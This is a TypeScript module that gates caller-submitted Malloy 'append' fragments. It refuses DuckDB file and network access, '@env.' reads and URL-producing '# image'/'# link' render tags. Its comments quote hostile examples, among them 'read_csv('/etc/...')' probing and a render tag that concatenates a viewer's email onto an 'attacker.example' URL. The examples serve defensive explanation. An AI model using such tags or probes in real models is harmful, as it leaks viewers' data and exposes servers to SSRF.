// Copyright (c) Credible Data Inc.
// SPDX-License-Identifier: MIT

import type { LogMessage, Model, Runtime } from "@malloydata/malloy";
import { Malloy, MalloyError, MalloyTranslator } from "@malloydata/malloy";
import type { Tag } from "@malloydata/malloy-tag";
import { CompileRefusedError, UnparseableTextError } from "../errors";
import {
   hasEnvReference,
   MAX_ANNOTATION_CHARS,
   onMotlyRoute,
   parseBounded,
   tagText,
} from "./motly";

/**
 * Construct containment for caller-submitted `/compile` text.
 *
 * Malloy resolves a source's schema AT COMPILE TIME: `duckdb.sql("...")`
 * sends a `DESCRIBE` to the connection before any query runs, and
 * `connection.table(...)` fetches the table's schema the same way. So a
 * compile-only endpoint still reaches the database, the filesystem and the
 * network on the caller's behalf. Against DuckDB's external access that makes
 * unrestricted compile an oracle rather than a check: `read_csv('/etc/...')`
 * distinguishes an existing file from a missing one by its error, names the
 * columns of whatever it does read, and `read_csv('https://...')` issues the
 * request. No rows come back, so the exposure is disclosure and SSRF rather
 * than bulk extraction.
 *
 * The query path already refuses these constructs with Malloy's restricted mode
 * (`loadRestrictedQuery`). This applies the same refusal at `append`, the one
 * compile scope whose text is a fragment judged against a curated model.
 *
 * SCOPE, STATED HONESTLY: `scope` is a request-body field the caller chooses,
 * and the three scopes carry no authorization difference today, so this keeps
 * fragment authoring on the model's published surface rather than containing an
 * adversary who can simply ask for `file`. `file` and `package` are ungated by
 * design -- there the text IS the model, where declaring sources and imports is
 * the point -- and that predates this module. Making the refusal a containment
 * boundary means authorizing the scope, which is a separate change.
 *
 * WHY THE COMPILER AND NOT A PATTERN MATCH: which spellings reach a connection
 * is the compiler's classification, not a list this module could keep current.
 * A byte match over untrusted text both over- and under-fires -- it would flag
 * `duckdb.sql` inside a string literal and miss any form it had not heard of.
 * Malloy decides, and reports its decisions with
 * `code: 'restricted-construct-forbidden'`.
 */

/** Malloy's stable marker for a construct restricted mode refuses. */
const RESTRICTED_CONSTRUCT_CODE = "restricted-construct-forbidden";

/**
 * Malloy's code for text that did not parse (`lang/parse-log.d.ts`). Emitted by
 * the parser's own error listener, so it marks the case where no tree was built
 * and therefore nothing in the text was classified.
 */
const SYNTAX_ERROR_CODE = "syntax-error";

/** Whether `problem` says the text failed to parse rather than failing to mean something. */
function isParseFailure(problem: LogMessage): boolean {
   return problem.code === SYNTAX_ERROR_CODE && problem.severity === "error";
}

/** The restricted-construct rejections among `problems`, if any. */
function restrictedRejections(problems: readonly LogMessage[]): LogMessage[] {
   return problems.filter(
      (problem) => problem.code === RESTRICTED_CONSTRUCT_CODE,
   );
}

/**
 * Render tags that turn a cell value into a URL or markup the viewer's browser
 * acts on: `# image` draws `<img src=value>` and `# link` an `<a href>`, with no
 * scheme or host check, so a field the caller defines as
 * `# image pic is concat('https://attacker.example/p?d=', email)` sends the
 * value the viewer may read to a host of the caller's choosing. A model's own
 * fields keep them (the modeler is trusted); a fragment may not write them.
 *
 * Malloy passes annotations through verbatim and the renderer reads them with
 * the MOTLY tag parser, so this reads them the same way: the fragment is
 * PARSED (no schema, no connection, so the answer cannot depend on whether the
 * data exists), every `#` and `#|` annotation is collected from its lexer tokens,
 * and each is parsed as MOTLY. Quoting, backticks, escapes, blocks and a field
 * named `link` used as a value all fall out of that, which a text match cannot
 * promise. Only the single-hash forms are field tags; `##` notes describe the
 * model and are never drawn.
 *
 * Not covered here: renderer sinks that take a data value with no tag (a chart
 * axis label measured through `innerHTML`, pivot headers). Those are the
 * renderer's to fix, and a host content-security-policy is the backstop.
 */
const HTML_START = /<[A-Za-z!/]/;

interface FragmentScan {
   /** Every single-hash annotation, a `#|` block's body included, as the lexer captured it. */
   annotations: string[];
   /** Names a field list excepts, and names a dimension, measure, join or rename declares. */
   excepted: Set<string>;
   declared: Set<string>;
}

const DECLARING = new Set([
   "DIMENSION",
   "MEASURE",
   "JOIN_ONE",
   "JOIN_MANY",
   "JOIN_CROSS",
   "RENAME",
]);

/** The name an identifier token spells, backticks removed. */
function nameOf(text: string): string {
   return text.startsWith("`") ? text.slice(1, -1) : text;
}

/** Scan the fragment's lexer tokens: no schema and no connection, so the answer cannot depend on the data. */
function scanFragment(source: string): FragmentScan {
   const url = "internal://render-tag-scan.malloy";
   const translator = new MalloyTranslator(url, null, {
      urls: { [url]: source },
   });
   const parsed = translator.parseStep.step(translator).parse;
   const scan: FragmentScan = {
      annotations: [],
      excepted: new Set(),
      declared: new Set(),
   };
   if (!parsed) return scan;
   // Symbolic names, not numeric types or parse-tree class names, so a Malloy upgrade or a minified build cannot silently blind the scan.
   const vocabulary = (
      parsed.tokenStream as unknown as {
         tokenSource: { vocabulary: { getSymbolicName(type: number): string } };
      }
   ).tokenSource.vocabulary;
   const tokens = parsed.tokenStream.getTokens().map((token) => ({
      name: vocabulary.getSymbolicName(token.type) ?? "",
      text: token.text ?? "",
   }));
   let mode: "except" | "declare" | undefined;
   let block: string | undefined;
   const closeBlock = () => {
      if (block !== undefined) scan.annotations.push(block);
      block = undefined;
   };
   for (let i = 0; i < tokens.length; i++) {
      const { name, text } = tokens[i];
      if (name === "BLOCK_ANNOTATION_BEGIN") {
         closeBlock();
         block = text;
         continue;
      }
      if (name === "BLOCK_ANNOTATION_TEXT") {
         if (block !== undefined) block += text;
         continue;
      }
      if (name === "BLOCK_ANNOTATION_END") {
         closeBlock();
         continue;
      }
      closeBlock();
      if (name === "ANNOTATION") {
         // `##` notes describe the model and are never drawn; a block's closer is not content.
         if (/^#(?!#)/.test(text)) scan.annotations.push(text);
         continue;
      }
      if (name === "EXCEPT") mode = "except";
      else if (DECLARING.has(name)) mode = "declare";
      else if (/^[a-z_]+:$/.test(text)) mode = undefined;
      else if (
         mode === "except" &&
         (name === "IDENTIFIER" || name === "BQ_STRING")
      ) {
         scan.excepted.add(nameOf(text));
      } else if (
         mode === "declare" &&
         (name === "IDENTIFIER" || name === "BQ_STRING") &&
         tokens[i + 1]?.name === "IS"
      ) {
         scan.declared.add(nameOf(text));
      }
   }
   closeBlock();
   return scan;
}

/** The first property in `tag` that is a URL-producing render tag, or markup in a `label`. */
function offendingTag(tag: Tag): string | undefined {
   for (const [name, child] of tag.entries()) {
      if (child.deleted) continue;
      if (name === "image" || name === "link")
         return `the render tag \`# ${name}\``;
      if (name === "label") {
         const label = tagText(tag, "label");
         if (label !== undefined && HTML_START.test(label)) {
            return "HTML in a `# label`";
         }
      }
      const elements = Array.isArray(child.eq) ? child.eq : [];
      for (const nested of [child, ...elements]) {
         const found = offendingTag(nested);
         if (found) return found;
      }
   }
   return undefined;
}

/**
 * The refusal for a fragment that writes a render tag turning a value into a URL or markup, reads
 * the server's environment from an annotation, or re-points a model field by excepting and redeclaring a column.
 */
function renderTagRefusal(source: string): string | undefined {
   const scan = scanFragment(source);
   for (const text of scan.annotations) {
      // `#(docs)`, `#"` and the other routes are prose or another namespace, not render tags.
      if (!onMotlyRoute(text)) continue;
      // The parser hydrates `@env.` from the server's environment; reading it, or neutralizing it, would hide the tag it sits beside.
      if (hasEnvReference(text)) {
         return "an annotation reads the server's environment (`@env.`), which a fragment may not do";
      }
      const parsed = parseBounded([text]);
      // A tag the parser rejects is one the renderer may still read differently, so it fails closed.
      if (parsed.messages.length > 0 || !parsed.tag) {
         return `an annotation does not parse as a tag, or exceeds ${MAX_ANNOTATION_CHARS} characters`;
      }
      const found = offendingTag(parsed.tag);
      if (found) {
         return (
            `the submitted text writes ${found}, ` +
            `which the viewer's browser would load or draw as markup. Fix: define the field in the ` +
            `model file itself, where a modeler owns what it links to.`
         );
      }
   }
   const shadowed = [...scan.excepted].filter((name) =>
      scan.declared.has(name),
   );
   if (shadowed.length > 0) {
      return (
         `the submitted text excepts and then declares \`${shadowed[0]}\`, which would re-point every ` +
         `model field derived from it, tags included. Fix: give the new field another name.`
      );
   }
   return undefined;
}

/**
 * Compile `source` against `model` in restricted mode and throw if it uses a
 * construct that reaches outside the model's curated surface.
 *
 * Only restricted-construct rejections are acted on here, with ONE exception:
 * a parse failure (below). Every other diagnostic -- an undefined field, a
 * redefinition -- is left untouched for the real compile to report, so this
 * gate never becomes a second source of ordinary compile errors with its own
 * coordinates and wording.
 *
 * The exception exists because this gate parses a DIFFERENT unit from the
 * compile it guards: it judges the fragment alone, while the real compile runs
 * `${modelContent}\n${source}`. It cannot simply be handed the concatenation --
 * `extendModel` judges text as an extension of a model that already holds those
 * declarations, so the model's own text comes back as `Cannot redefine` for
 * every source in it and nothing in the appended fragment is classified at all.
 * So the units stay different, and the gate instead refuses whenever it could
 * not parse what it was given.
 *
 * What is ruled out above is the CONCATENATION, not the fragment. Running the
 * real append compile as an unrestricted `extendModel` of the loaded base model
 * -- the fragment alone, once, in place of both compiles -- is a live option: it
 * would make the gate and the compile one unit and drop the second compile from
 * inside the per-package mutex, at the cost of offsetting every diagnostic
 * position by the model's line count. It is a larger change than this gate, and
 * the parse-failure refusal is sufficient without it.
 *
 * The gate is deliberately a separate compile from the one whose diagnostics
 * the caller receives. Restricted mode changes what compiles, so reusing its
 * result as the answer would change the positions and the problem set an
 * author sees for legitimate text. This runs first, refuses or passes, and the
 * unrestricted compile then proceeds exactly as before.
 */
export async function assertNoRestrictedConstructs(
   runtime: Runtime,
   // Not `Model | undefined`. Several of the constructs this refuses --
   // `name!type(...)` and the `sql_*` family -- are classified inside
   // `computeExpression(fs)` and need a resolved FieldSpace, so with no base
   // model they are never classified and the gate returns clean on text it
   // should refuse. Requiring one makes that a type error rather than a
   // convention a later caller can break silently.
   model: Model,
   source: string,
): Promise<void> {
   const refusal = renderTagRefusal(source);
   if (refusal) {
      throw new CompileRefusedError(
         `This Malloy cannot be compiled at scope "append", which validates a ` +
            `fragment against the model's published surface: ${refusal}`,
      );
   }
   let problems: readonly LogMessage[];
   try {
      const compiled = await Malloy.compile({
         source,
         model,
         restrictedMode: true,
         // Labels the synthetic `internal://` URL this compile is given; the
         // text is an extension of an already-loaded model, not a model of its
         // own.
         method: "extendModel",
         urlReader: runtime.urlReader,
         connections: runtime.connections,
         // Collect problems rather than throwing on the first one, so a caller
         // using two forbidden constructs is told about both at once.
         noThrowOnError: true,
      });
      problems = compiled.problems ?? [];
   } catch (error) {
      // A MalloyError still carries the diagnostics, so a restricted rejection
      // that arrives as a throw is the refusal this gate exists for. Anything
      // else is an infrastructure failure (an unreachable connection, a bad
      // URL) and must stay distinguishable from "the caller wrote something
      // forbidden" -- silently treating it as a pass would open the gate on
      // exactly the errors that carry no evidence either way.
      if (!(error instanceof MalloyError)) throw error;
      problems = error.problems;
   }

   const rejected = restrictedRejections(problems);
   if (rejected.length === 0) {
      // A PARSE FAILURE IS NOT A PASS. Classification happens while walking a
      // parsed tree, so text that never parsed was never judged -- the gate
      // saw no forbidden construct because it saw no constructs at all. Before
      // this, that silence was read as approval, which is the wrong direction
      // for a gate: the one text guaranteed to produce it is text that does
      // not stand alone, and the real compile may still run it as part of a
      // larger whole.
      //
      // Only a parse-level failure is treated this way. An ordinary semantic
      // error -- an undefined field, a redefinition -- means the tree WAS
      // walked and the constructs in it WERE classified, so the absence of a
      // rejection there is real evidence and the diagnostic belongs to the
      // caller-facing compile rather than to this gate.
      if (problems.some(isParseFailure)) {
         throw new UnparseableTextError(
            `This Malloy cannot be compiled at scope "append": the submitted ` +
               `text could not be parsed on its own, so it cannot be checked ` +
               `against the model's published surface. Fix: send text that ` +
               `stands alone as top-level Malloy -- a complete ` +
               `\`source:\`/\`query:\`/\`run:\` statement rather than a ` +
               `continuation of one already in the model.`,
         );
      }
      return;
   }

   // A caller-input refusal, so 400 rather than a compile-diagnostics response:
   // the text is not being reported as invalid Malloy, it is being refused.
   throw new CompileRefusedError(
      `This Malloy cannot be compiled at scope "append", which validates a ` +
         `fragment against the model's published surface: ` +
         `${rejected.map((problem) => problem.message).join(" ")} ` +
         `Fix: reference the model's own sources. Defining sources and ` +
         `imports belongs in the model file itself -- see the compile-scope ` +
         `documentation.`,
   );
}
